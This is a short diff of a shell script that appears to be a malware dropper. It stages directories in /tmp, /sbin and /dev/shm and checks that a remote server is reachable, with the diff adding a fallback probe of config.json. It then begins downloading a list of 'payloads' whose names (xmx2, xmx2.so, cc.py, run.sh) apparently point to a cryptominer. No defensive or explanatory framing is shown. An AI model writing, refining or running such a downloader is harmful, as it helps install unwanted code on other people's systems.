@@ -12,7 +12,7 @@ mkdir -p /tmp/payloads /sbin /dev/shm
 cd /tmp/payloads
 
 log "$Y" "Testing connectivity: $BASE"
-curl -sf --max-time 3 "$BASE/" >/dev/null || { log "$R" "Server unreachable"; exit 1; }
+curl -s --max-time 10 --connect-timeout 10 "$BASE/" >/dev/null 2>&1 || curl -s --max-time 10 "$BASE/config.json" >/dev/null || { log "$R" "Server unreachable"; exit 1; }
 
 PAYLOADS="xmx2 www cc.py pt xmx2.so run.sh config.json noumt"
 log "$Y" "Downloading $(echo $PAYLOADS | wc -w) payloads"
